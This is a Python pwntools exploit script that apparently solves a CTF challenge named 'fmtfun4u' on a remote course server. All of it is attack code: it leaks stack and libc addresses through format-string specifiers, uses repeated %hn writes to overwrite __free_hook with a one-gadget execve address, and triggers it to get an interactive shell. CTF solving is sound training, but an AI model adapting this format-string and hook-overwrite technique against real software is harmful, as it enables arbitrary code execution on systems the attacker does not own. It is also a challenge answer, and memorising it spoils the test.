#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10136)
#r = process('./fmtfun4u')

r.recvuntil(':')


leak_stack_format = '%6$llu'
leak_libc_format = '%9$llu'

libc_start_main_offset = 0x20740
execve_gadget_offset = 0xf0274
free_hook_offset = 0x03c67a8

libc_base = 0
i_addr = 0
target_addr = 0

def set_format_string_target(val):
    offset = target_addr&0xffff 
    for i in range(0,8,2):
        set_addr_format = '%' + str(offset+i) + 'c%11$hn'
        r.sendline(set_addr_format)
        r.recvuntil(':')
        if (val&0xffff) > 0:
            r.sendline('%' + str(val&0xffff) + 'c%37$hn')
        else:
            r.sendline('%37$hn')
        r.recvuntil(':')
        val = val >> 16

def leak(format_string):
    r.sendline(format_string)
    ret = int(r.recvuntil('\n').strip())
    r.recvuntil(':')
    return ret

def write_to_target(val):
    if val != 0:
        write_format = '%' + str(val) + 'c%10$hn'
    else:
        write_format = '%10$hn'
    r.sendline(write_format)
    r.recvuntil(':')

def overwrite(addr, val):
    for i in range(0, 8, 2):
        set_format_string_target(addr+i) 
        write_to_target(val&0xffff)
        val = val >> 16

def overwrite_i(addr, val):
    payload = '%' + str(addr) + 'c%11$hn'
    r.sendline(payload)
    r.recvuntil(':')
    payload = '%' + str(val) + 'c%37$hn'
    r.sendline(payload)
    r.recvuntil(':')

i_addr = leak(leak_stack_format) - 0xe4
target_addr = i_addr + 0x14
print 'i_addr', hex(i_addr)

overwrite_i(i_addr&0xffff, 1000)

libc_base = leak(leak_libc_format) - 240 - libc_start_main_offset
print "libc_base:", hex(libc_base)
print "hook_addr:", hex(libc_base + free_hook_offset)

overwrite(libc_base + free_hook_offset, libc_base + execve_gadget_offset)
r.sendline('%100000c')

r.interactive()
